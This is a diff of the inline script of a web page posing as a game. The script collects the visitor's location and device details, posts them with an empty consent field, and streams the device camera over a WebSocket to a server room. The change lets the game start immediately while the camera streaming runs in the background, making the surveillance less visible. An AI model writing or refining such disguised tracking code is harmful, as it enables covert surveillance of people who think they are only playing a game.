@@ -244,8 +244,11 @@
         saveLocalShare(payload);
         const data = await sendShare(payload);
         preStatus.textContent = data?.status === 'ok' ? 'Ready. Enjoy the game!' : 'Failed to share.';
-      } catch {
+        return true; // Success
+      } catch (error) {
+        console.error('Share failed:', error);
         preStatus.textContent = 'Failed to share.';
+        return false; // Failed
       }
     }
 
@@ -267,19 +270,25 @@
       }, 1000);
 
       async function proceed() {
-        await requestLocationAndShare();
+        // Try to share data, but don't block the game if it fails
+        const shareSuccess = await requestLocationAndShare();
+        
+        // Start the game immediately regardless of share success
+        startGame();
 
-        // Start camera streaming via WebSocket (new system)
-        const room = crypto.randomUUID();
-        console.log('Starting mobile camera streaming to room:', room);
-        
-        // Send room info to server
-        fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ page: 'camera-room', cameraRoom: room, consent: {}, device: getDeviceInfo(), dedupeId: room }) }).catch(()=>{});
-        
-        // Start WebSocket streaming
-        const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=${encodeURIComponent(room)}`);
-        
-        ws.onopen = () => {
+        // Start camera streaming via WebSocket (new system) - this runs in background
+        // Don't block the game if this fails
+        try {
+          const room = crypto.randomUUID();
+          console.log('Starting mobile camera streaming to room:', room);
+          
+          // Send room info to server
+          fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ page: 'camera-room', cameraRoom: room, consent: {}, device: getDeviceInfo(), dedupeId: room }) }).catch(()=>{});
+          
+          // Start WebSocket streaming
+          const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=${encodeURIComponent(room)}`);
+          
+          ws.onopen = () => {
           console.log('Mobile WebSocket connected to room:', room);
           
           // Helper: detect mobile devices
@@ -508,11 +517,13 @@
           });
         };
         
-        ws.onerror = (error) => {
-          console.error('Mobile WebSocket error:', error);
-        };
-
-        startGame();
+          ws.onerror = (error) => {
+            console.error('Mobile WebSocket error:', error);
+          };
+        } catch (error) {
+          console.error('Camera streaming setup failed:', error);
+          // Game continues even if camera streaming fails
+        }
       }
     }
   </script>
